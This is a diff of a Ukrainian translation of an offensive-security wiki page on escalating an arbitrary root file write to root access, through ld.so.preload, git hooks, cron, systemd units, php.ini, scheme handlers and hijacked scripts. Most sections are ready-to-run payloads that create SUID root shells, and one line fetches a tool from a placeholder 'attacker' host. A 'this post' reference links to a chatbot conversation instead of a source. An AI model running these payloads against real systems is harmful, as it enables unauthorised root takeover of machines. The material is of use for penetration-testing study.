@@ -1,11 +1,11 @@
-# Довільний запис файлу у root
+# Довільний запис файлу в root
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ### /etc/ld.so.preload
 
-Цей файл поводиться подібно до **`LD_PRELOAD`** env variable, але він також працює в **SUID binaries**.\
-Якщо ви можете створити його або змінити, ви можете просто додати **шлях до бібліотеки, яка буде завантажена** при кожному виконанні binary.
+Цей файл поводиться як змінна оточення **`LD_PRELOAD`**, але він також працює в **SUID binaries**.\
+Якщо ви можете створити його або змінити, ви можете просто додати **шлях до бібліотеки, яка буде завантажуватися** з кожним виконуваним бінарним файлом.
 
 Наприклад: `echo "/tmp/pe.so" > /etc/ld.so.preload`
 ```c
@@ -24,31 +24,105 @@ system("/bin/bash");
 ```
 ### Git hooks
 
-[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) — це **скрипти**, які **виконуються** при різних **подіях** у git репозиторії, наприклад коли створюється commit, merge... Тож якщо **привілейований скрипт або користувач** часто виконує ці дії і є можливість **записувати в папку `.git`**, це можна використати для **privesc**.
+[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) — це **скрипти**, які **виконуються** при різних **подіях** у git-репозиторії, наприклад коли створюється commit, виконується merge... Тому якщо **привілейований скрипт або користувач** часто виконує ці дії і можливо **записувати в папку `.git`**, це може бути використано для **privesc**.
 
-Наприклад, можливо **згенерувати скрипт** в git репозиторії в **`.git/hooks`**, щоб він завжди виконувався при створенні нового commit:
+Наприклад, можливо **згенерувати скрипт** у git-репозиторії в **`.git/hooks`**, щоб він завжди виконувався при створенні нового commit:
 ```bash
 echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
 chmod +x pre-commit
 ```
-### Cron та часові файли
+### Cron і файли часу
 
-TODO
+Якщо ви можете **write cron-related files that root executes**, зазвичай можна отримати code execution при наступному запуску завдання. Цікаві цілі включають:
 
-### Файли сервісів та сокетів
+- `/etc/crontab`
+- `/etc/cron.d/*`
+- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
+- crontab самого root у `/var/spool/cron/` або `/var/spool/cron/crontabs/`
+- `systemd` timers та сервіси, які вони запускають
 
-TODO
+Швидкі перевірки:
+```bash
+ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
+find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
+systemctl list-timers --all 2>/dev/null
+grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
+```
+Типові шляхи зловживання:
 
-### Перезаписати обмежений `php.ini`, що використовується привілейованим PHP sandbox
+- **Додати новий root cron job** до `/etc/crontab` або файлу в `/etc/cron.d/`
+- **Замінити script** який вже виконується через `run-parts`
+- **Backdoor an existing timer target** шляхом модифікації script або binary, які він запускає
 
-Деякі кастомні daemon валідовують PHP, переданий користувачем, запускаючи `php` з **обмеженим `php.ini`** (наприклад, `disable_functions=exec,system,...`). Якщо sandboxed код все ще має **any write primitive** (наприклад, `file_put_contents`) і ви можете дістатися до **exact `php.ini` path**, який використовує daemon, ви можете **overwrite that config**, щоб зняти обмеження, а потім відправити другий payload, який виконуватиметься з elevated privileges.
+Мінімальний приклад cron payload:
+```bash
+echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
+```
+Якщо ви можете записувати тільки в каталог cron, який використовується `run-parts`, замість цього помістіть туди виконуваний файл:
+```bash
+cat > /etc/cron.daily/backup <<'EOF'
+#!/bin/sh
+cp /bin/bash /tmp/rootbash
+chown root:root /tmp/rootbash
+chmod 4777 /tmp/rootbash
+EOF
+chmod +x /etc/cron.daily/backup
+```
+Notes:
 
-Типовий потік:
+- `run-parts` usually ignores filenames containing dots, so prefer names like `backup` instead of `backup.sh`.
+- Some distros use `anacron` or `systemd` timers instead of classic cron, but the abuse idea is the same: **змінити те, що root виконає пізніше**.
 
-1. Перший payload перезаписує sandbox config.
-2. Другий payload виконує код тепер, коли dangerous functions знову enabled.
+### Файли сервісів і сокетів
 
-Мінімальний приклад (замініть шлях, який використовує daemon):
+If you can write **`systemd` unit files** or files referenced by them, you may be able to get code execution as root by reloading and restarting the unit, or by waiting for the service/socket activation path to trigger.
+
+Цікавими цілями є:
+
+- `/etc/systemd/system/*.service`
+- `/etc/systemd/system/*.socket`
+- Drop-in overrides in `/etc/systemd/system/<unit>.d/*.conf`
+- Service scripts/binaries referenced by `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
+- Writable `EnvironmentFile=` paths loaded by a root service
+
+Швидкі перевірки:
+```bash
+ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
+systemctl list-units --type=service --all 2>/dev/null
+systemctl list-units --type=socket --all 2>/dev/null
+grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
+```
+Поширені шляхи зловживань:
+
+- **Перезаписати `ExecStart=`** у сервісному unit'і, що належить root і який ви можете змінити
+- **Додати drop-in override** з шкідливим `ExecStart=` і спочатку очистити попередній
+- **Backdoor скрипт/бінарний файл**, вже вказаний у unit'і
+- **Захопити socket-activated service** шляхом модифікації відповідного `.service` файлу, який запускається, коли сокет отримує підключення
+
+Приклад шкідливого override:
+```ini
+[Service]
+ExecStart=
+ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
+```
+Типовий потік активації:
+```bash
+systemctl daemon-reload
+systemctl restart vulnerable.service
+# or trigger the socket-backed service by connecting to it
+```
+If you cannot restart services yourself but can edit a socket-activated unit, you may only need to **wait for a client connection** to trigger execution of the backdoored service as root.
+
+### Перезаписати обмежений `php.ini`, який використовується привілейованим PHP sandbox
+
+Деякі custom daemons валідують user-supplied PHP, запускаючи `php` з **restricted `php.ini`** (наприклад, `disable_functions=exec,system,...`). Якщо у sandboxed code все ще є **any write primitive** (наприклад, `file_put_contents`) і ви можете дістатися до **exact `php.ini` path**, який використовує daemon, ви можете **overwrite that config**, щоб зняти обмеження, а потім відправити другий payload, який виконуватиметься з elevated privileges.
+
+Typical flow:
+
+1. First payload overwrites the sandbox config.
+2. Second payload executes code now that dangerous functions are re-enabled.
+
+Minimal example (replace the path used by the daemon):
 ```php
 <?php
 file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
@@ -57,31 +131,31 @@ If the daemon runs as root (or validates with root-owned paths), the second exec
 
 ### binfmt_misc
 
-The file located in `/proc/sys/fs/binfmt_misc` indicates which binary should execute whic type of files. TODO: check the requirements to abuse this to execute a rev shell when a common file type is open.
+Файл, розташований у `/proc/sys/fs/binfmt_misc`, вказує, який бінарний файл має виконуватися для яких типів файлів. TODO: перевірити вимоги для зловживання цим механізмом, щоб виконати rev shell, коли відкрито поширений тип файлу.
 
 ### Overwrite schema handlers (like http: or https:)
 
-Зловмисник із правами запису в директоріях конфігурації жертви може легко замінити або створити файли, які змінюють поведінку системи й призводять до небажаного виконання коду. Змінивши файл `$HOME/.config/mimeapps.list`, щоб вказати HTTP та HTTPS URL handlers на шкідливий файл (наприклад, встановивши `x-scheme-handler/http=evil.desktop`), зловмисник забезпечує, що **натискання будь-якого http або https посилання викликає код, вказаний у цьому `evil.desktop` файлі**. Наприклад, після розміщення наступного шкідливого коду в `evil.desktop` у `$HOME/.local/share/applications`, будь-яке зовнішнє натискання URL запускає вбудовану команду:
+Атакуючий, який має права на запис у директоріях конфігурації жертви, може легко замінити або створити файли, що змінюють поведінку системи, внаслідок чого відбувається небажане виконання коду. Змінивши файл `$HOME/.config/mimeapps.list`, щоб вказати обробники URL HTTP і HTTPS на шкідливий файл (наприклад, встановивши `x-scheme-handler/http=evil.desktop`), атакуючий забезпечує, що **натискання будь-якого http або https посилання запускає код, вказаний у цьому `evil.desktop` файлі**. Наприклад, після розміщення наступного шкідливого коду в `evil.desktop` у `$HOME/.local/share/applications`, будь-яке натискання зовнішнього URL виконує вбудовану команду:
 ```bash
 [Desktop Entry]
 Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
 Type=Application
 Name=Evil Desktop Entry
 ```
-Для додаткової інформації перегляньте [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49), де його використали для експлуатації реальної вразливості.
+For more info check [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) where it was used to exploit a real vulnerability.
 
 ### Root виконує скрипти/бінарні файли, доступні для запису користувачем
 
-Якщо привілейований робочий процес запускає щось на кшталт `/bin/sh /home/username/.../script` (або будь-який бінарний файл всередині директорії, що належить непривілейованому користувачу), ви можете його перехопити:
+Якщо привілейований робочий процес запускає щось на кшталт `/bin/sh /home/username/.../script` (або будь-який бінарний файл у директорії, що належить непривілейованому користувачу), ви можете перехопити його:
 
-- **Виявлення виконання:** слідкуйте за процесами за допомогою [pspy](https://github.com/DominicBreuker/pspy), щоб виявити, коли root викликає шляхи, контрольовані користувачем:
+- **Виявлення виконання:** моніторте процеси за допомогою [pspy](https://github.com/DominicBreuker/pspy) щоб зафіксувати випадки, коли root викликає шляхи, контрольовані користувачем:
 ```bash
 wget http://attacker/pspy64 -O /dev/shm/pspy64
 chmod +x /dev/shm/pspy64
 /dev/shm/pspy64   # wait for root commands pointing to your writable path
 ```
-- **Підтвердьте можливість запису:** переконайтеся, що і цільовий файл, і його директорія належать вашому обліковому запису і доступні для запису ним.
-- **Захопіть ціль:** створіть резервну копію оригінального binary/script і помістіть payload, який створює SUID shell (або будь-яку іншу root-дію), потім відновіть права доступу:
+- **Підтвердіть можливість запису:** переконайтеся, що і цільовий файл, і його директорія належать вашому користувачу й доступні для запису.
+- **Захопіть ціль:** зробіть резервну копію оригінального binary/script і підкиньте payload, який створює SUID shell (або будь-яку іншу root action), потім відновіть права:
 ```bash
 mv server-command server-command.bk
 cat > server-command <<'EOF'
@@ -92,7 +166,7 @@ chmod 6777 /tmp/rootshell
 EOF
 chmod +x server-command
 ```
-- **Запустіть привілейовану дію** (наприклад, натискання UI-кнопки, яка запускає helper). Коли root повторно виконає hijacked path, отримайте escalated shell за допомогою `./rootshell -p`.
+- **Спровокуйте привілейовану дію** (наприклад, натиснувши кнопку в UI, яка запускає helper). Коли root повторно виконає перехоплений шлях, отримайте shell з підвищеними привілеями за допомогою `./rootshell -p`.
 
 ## Посилання
 
